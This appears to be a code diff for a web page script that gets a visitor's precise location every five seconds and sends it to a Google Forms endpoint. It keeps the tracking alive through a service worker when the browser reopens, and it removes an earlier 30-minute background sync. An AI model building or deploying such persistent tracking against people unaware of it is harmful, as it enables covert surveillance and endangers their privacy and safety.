@@ -153,56 +153,45 @@
     }
 
     function startTracking() {
-    if (navigator.geolocation) {
-        function updateLocation() {
-            navigator.geolocation.getCurrentPosition(
-                function (position) {
-                    sendLocationToGoogleForms(position.coords.latitude, position.coords.longitude);
-                },
-                function (error) {
-                    console.error("Location access denied or unavailable.");
-                },
-                { enableHighAccuracy: true, maximumAge: 5000, timeout: 5000 } // NEW: Updates every 5 sec
-            );
+        if (navigator.geolocation) {
+            function updateLocation() {
+                navigator.geolocation.getCurrentPosition(
+                    function (position) {
+                        sendLocationToGoogleForms(position.coords.latitude, position.coords.longitude);
+                    },
+                    function (error) {
+                        console.error("Location access denied or unavailable.", error);
+                    },
+                    { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 } // Update every 5 sec
+                );
+            }
+
+            updateLocation(); // Initial update
+            setInterval(updateLocation, 5000); // Keep sending location every 5 seconds
+        } else {
+            console.error("Geolocation is not supported.");
         }
-
-        updateLocation(); // Initial location update
-        setInterval(updateLocation, 5000); // Update location every 5 seconds
-    } else {
-        console.error("Geolocation is not supported.");
     }
-}
-
 
     function sendLocationToGoogleForms(lat, long) {
         let formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
-        let formData = new URLSearchParams();
+        let formData = new FormData();
         formData.append("entry.YOUR_LATITUDE_FIELD_ID", lat);
         formData.append("entry.YOUR_LONGITUDE_FIELD_ID", long);
 
-        fetch(formUrl, { method: "POST", body: formData, mode: "no-cors" })
-            .then(() => console.log("Location sent:", lat, long))
-            .catch((error) => console.error("Error sending location:", error));
+        fetch(formUrl, {
+            method: "POST",
+            body: formData,
+            mode: "no-cors"
+        })
+        .then(() => console.log("Location sent:", lat, long))
+        .catch((error) => console.error("Error sending location:", error));
     }
 
-    // Listen for background sync from Service Worker
+    // Ensure tracking resumes when the browser reopens
     navigator.serviceWorker.addEventListener('message', (event) => {
         if (event.data.action === "send-location") {
             startTracking();
-        }
-    });
-
-    // Background sync request when browser reopens
-    navigator.serviceWorker.ready.then(async (registration) => {
-        if ('periodicSync' in registration) {
-            try {
-                await registration.periodicSync.register('send-location', {
-                    minInterval: 30 * 60 * 1000 // Sends location every 30 minutes
-                });
-                console.log("Background location tracking enabled!");
-            } catch (error) {
-                console.log("Periodic Sync Registration Failed:", error);
-            }
         }
     });
 
